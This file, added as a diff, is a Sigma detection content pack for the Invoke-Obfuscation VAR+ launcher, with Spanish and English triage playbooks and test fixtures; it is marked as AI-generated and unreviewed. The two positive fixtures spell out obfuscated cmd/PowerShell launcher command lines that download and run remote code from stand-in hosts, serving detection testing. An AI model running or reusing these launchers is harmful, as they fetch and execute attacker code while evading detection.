@@ -1,0 +1,129 @@
+{
+  "rule": {
+    "id": "27aec9c9-dbb0-4939-8422-1742242471d0",
+    "title": "Invoke-Obfuscation VAR+ Launcher",
+    "level": "high",
+    "status": "test",
+    "author": "Jonathan Cheong, oscd.community",
+    "path": "windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_var.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_var.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027",
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "cmd.exe definió una variable de entorno con un comando de PowerShell y luego lanzó PowerShell para reconstruirla y ejecutarla con el operador de formato -f. Este patrón coincide con el launcher VAR+ de Invoke-Obfuscation.",
+      "what_it_detects": "Eventos de creación de procesos cuyo CommandLine coincide con una expresión regular sensible a mayúsculas: 'cmd' con /c o /r, seguido de \"set <VAR>=...\", marcadores de formato como {0}{1} seguidos de \\\" -f, y llamadas entre paréntesis. Es la forma de 'cmd /c \"set X=...&& powershell ...\"'.",
+      "why_it_matters": "Invoke-Obfuscation es un framework público para ofuscar PowerShell. Guardar el payload en una variable de entorno lo oculta de la línea de comandos de PowerShell y dificulta su detección (T1027, archivos o información ofuscados). La ejecución final usa PowerShell (T1059.001) y muchas veces descarga y ejecuta código remoto.",
+      "triage_steps": [
+        "Lea el CommandLine completo y extraiga el valor que se asigna con set. Busque Invoke-Expression, DownloadString, Net.WebClient o URLs.",
+        "Desofusque los fragmentos -f a mano o en un sandbox reordenando los índices {n}. Nunca ejecute el comando en el host.",
+        "Revise ParentImage: Office, el navegador, wscript, mshta o un servicio como padre indica entrega por phishing o explotación.",
+        "Identifique los procesos hijos de cmd.exe y de powershell.exe, y busque conexiones de red del mismo host en un rango de +/- 15 minutos.",
+        "Correlacione con los logs de PowerShell (Script Block 4104) del mismo host para recuperar el script ya desofuscado.",
+        "Verifique el usuario: si tiene privilegios y si ha iniciado sesión desde otros equipos. Revise alertas anteriores del mismo host y usuario.",
+        "Busque la misma cadena o el mismo dominio de descarga en otros endpoints para medir el alcance."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos. Puede dispararse en ejercicios de red team o pentests autorizados con Invoke-Obfuscation.",
+        "Puede dispararse en laboratorios de investigadores que prueban detecciones o generan muestras con el framework."
+      ],
+      "response_steps": [
+        "Confirme la actividad con el dueño del activo o con el equipo de red team. Si no está autorizada, trátela como un incidente.",
+        "Aísle el endpoint desde el EDR y bloquee las URLs, dominios o IPs extraídos del payload.",
+        "Recolecte la memoria, los logs de PowerShell y los artefactos descargados. Busque persistencia (tareas programadas, claves Run, servicios).",
+        "Restablezca las credenciales del usuario afectado y restaure el equipo desde una imagen limpia si se confirma el compromiso."
+      ],
+      "severity_rationale": "El nivel high se justifica porque este patrón de ofuscación casi nunca aparece en la administración legítima y suele preceder a la descarga y ejecución de malware."
+    },
+    "en": {
+      "summary": "cmd.exe set an environment variable that holds a PowerShell command, then started PowerShell to rebuild it with the -f format operator and run it. This matches the Invoke-Obfuscation VAR+ launcher.",
+      "what_it_detects": "Process creation events whose CommandLine matches a case-sensitive regex: 'cmd' with /c or /r, then \"set <VAR>=...\", format placeholders such as {0}{1} followed by \\\" -f, and parenthesised calls. This is the 'cmd /c \"set X=...&& powershell ...\"' launcher form.",
+      "why_it_matters": "Invoke-Obfuscation is a public framework for obfuscating PowerShell. Storing the payload in an environment variable hides it from PowerShell's own command line and evades detection (T1027, obfuscated files or information). The payload then runs through PowerShell (T1059.001), often as a download-and-execute cradle.",
+      "triage_steps": [
+        "Read the full CommandLine and pull out the value assigned by set. Look for Invoke-Expression, DownloadString, Net.WebClient or URLs.",
+        "Deobfuscate the -f fragments by reordering the {n} indexes, by hand or in a sandbox. Never run the command on the host.",
+        "Check ParentImage. Office, a browser, wscript, mshta or a service as parent points to phishing or exploitation.",
+        "List the child processes of cmd.exe and powershell.exe. Check network connections from the same host within +/- 15 minutes.",
+        "Correlate with PowerShell Script Block logs (4104) on the same host to recover the deobfuscated script.",
+        "Check the user: privileges, logons from other hosts, and earlier alerts for the same host and user.",
+        "Search other endpoints for the same string or download domain to scope the activity."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives. Authorized red team or penetration tests that use Invoke-Obfuscation can trigger it.",
+        "Researcher or detection-engineering labs that generate samples with the framework can also trigger it."
+      ],
+      "response_steps": [
+        "Check with the asset owner or the red team that the activity was authorized. If it was not, handle it as an incident.",
+        "Isolate the endpoint through EDR and block the URLs, domains or IPs found in the payload.",
+        "Collect memory, PowerShell logs and any downloaded artifacts. Hunt for persistence such as scheduled tasks, Run keys and services.",
+        "If compromise is confirmed, reset the user's credentials and reimage the host from a clean image."
+      ],
+      "severity_rationale": "High fits because this obfuscation pattern almost never shows up in legitimate administration and usually comes right before malware is downloaded and run."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "VAR+ launcher: cmd /c sets NOtI with a download cradle, then PowerShell rebuilds it with \"{n}\" -f format strings",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "cmd.exe /c \"set NOtI=Invoke-Expression (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a')&& powershell -NoL SET-iteM ( 'VAR' + 'i'+ 'A' + 'blE:Ao6' + 'I0') ( [TYpe](\\\"{2}{3}{0}{1}\\\" -f 'iRoN','mENT','e','nv') ) ; ${exECUtIONCOnTEXT}.\\\"IN`VO`KecOmMaND\\\".\\\"inVo`KES`crIPt\\\"( ( ( GEt-VAriAble ( 'a' + 'o6I0') -vaLU )::(\\\"{1}{4}{2}{3}{0}\\\" -f'e','gETenvIR','NtvaRIa','BL','ONme' ).Invoke(( \\\"{0}{1}\\\"-f'n','oti' ),( \\\"{0}{1}\\\" -f'pRoC','esS') )) )\"",
+          "ProcessId": 6412
+        }
+      },
+      {
+        "description": "VAR+ launcher variant: set SlDb, then Get-Variable/gci env: rebuilt with format operators",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "cmd.exe /c \"set SlDb=Invoke-Expression (New-Object Net.WebClient).DownloadString('http://update.example.org/s')&& powershell .(( ^&(\\\"{1}{0}{2}{3}\\\" -f 'eT-vaR','G','iab','lE' ) (\\\"{0}{1}\\\" -f '*m','DR*' ) ).\\\"na`ME\\\"[3,11,2]-JOIN'' ) ( ( ^&(\\\"{0}{1}\\\" -f'g','CI' ) (\\\"{0}{1}\\\" -f 'ENV',':SlDb' ) ).\\\"VA`luE\\\" ) \"",
+          "ProcessId": 7720
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate cmd /c set used by a build script; no format placeholders or -f operator",
+        "event": {
+          "EventID": 1,
+          "Computer": "BUILD-03.andes.example.com",
+          "User": "ANDES\\svc_build",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "ParentImage": "C:\\Program Files\\Jenkins\\jenkins.exe",
+          "CommandLine": "cmd.exe /c \"set JAVA_HOME=C:\\Program Files\\Java\\jdk-17&& java -version\"",
+          "ProcessId": 3104
+        }
+      },
+      {
+        "description": "Near miss: set plus PowerShell -f, but the placeholder is followed by a single quote, not \\\"",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "cmd.exe /c \"set BUILD=42&& powershell -NoProfile -Command Write-Host ('Build {0}' -f $env:BUILD)\"",
+          "ProcessId": 5530
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
